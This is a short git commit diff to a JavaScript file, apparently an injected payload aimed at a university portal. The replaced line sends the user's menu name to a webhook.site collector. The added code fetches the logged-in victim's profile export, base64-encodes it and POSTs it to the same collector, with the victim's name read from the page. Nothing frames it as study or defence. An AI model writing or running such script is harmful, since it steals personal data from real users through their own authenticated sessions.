816e60157d3f24361d5a41482d480e52a3bd6e1f
Alexey <dunaevai13579@gmail.com>
2021-09-28 02:50:06 +0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,8 @@
-$.get('https://webhook.site/9a3472c5-0292-4ebc-b194-7877b6a1db97?с='+document.querySelector('a.user-menu:nth-child(1)').innerText)
+var response = await fetch("https://isu.ifmo.ru/pls/apex/f?p=2437:31:116454897633873:EXPORTPROFILE:NO:::");
+var content = await response.blob();
+var reader = new FileReader();
+reader.readAsDataURL(content);
+reader.onloadend = function() {
+  var base64data = reader.result;
+  fetch("https://webhook.site/9a3472c5-0292-4ebc-b194-7877b6a1db97/"+document.querySelector('#USER_FIO').value, { method: 'POST', body: base64data });
+}
